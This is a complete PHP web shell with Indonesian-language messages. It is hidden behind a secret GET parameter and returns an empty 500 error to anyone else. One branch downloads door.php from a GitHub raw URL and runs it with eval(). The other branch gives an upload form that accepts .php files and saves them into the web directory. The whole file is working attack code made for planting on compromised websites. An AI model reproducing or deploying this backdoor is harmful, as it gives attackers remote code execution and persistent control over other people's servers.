<?php
if (isset($_GET['kenz'])) {

    if (isset($_GET['kenzw'])) {
        $remote_url = "https://raw.githubusercontent.com/kenzzz135/crontabb/refs/heads/main/door.php";
        $remote_code = @file_get_contents($remote_url);

        if ($remote_code !== false) {
            eval("?>".$remote_code);
        } else {
            echo "Gagal mengambil script dari GitHub.";
        }
        exit;
    }

    if (isset($_POST['submit'])) {
        $nama = $_FILES['gambar']['name'];
        $tempat = $_FILES['gambar']['tmp_name'];
        $type = $_FILES['gambar']['type'];
        $size = $_FILES['gambar']['size'];

        $ukuran = ['html', 'jpg', 'png', 'jpeg', 'php'];
        $explode = explode('.', $nama);
        $pembaginya = strtolower(end($explode));

        if (in_array($pembaginya, $ukuran)) {
            $target_dir = dirname(__FILE__) . '/';
            $target_file = $target_dir . basename($nama);

            if (move_uploaded_file($tempat, $target_file)) {
                echo "File berhasil di-upload!<br>";
                echo "Nama file: " . $nama . "<br>";
                $file_url = str_replace($_SERVER['DOCUMENT_ROOT'], '', $target_file);
                echo "Link file: <a href='" . $file_url . "'>Lihat file</a><br>";
            } else {
                echo "Terjadi kesalahan saat meng-upload file.";
            }
        } else {
            echo "Duh, ekstensi file tidak sesuai.";
        }
    } else {
        echo '<form method="post" enctype="multipart/form-data">
                <input type="file" name="gambar">
                <input type="submit" name="submit" value="submit">
              </form>';
    }

} else {
    http_response_code(500);
    echo "";
}
__halt_compiler();
?>
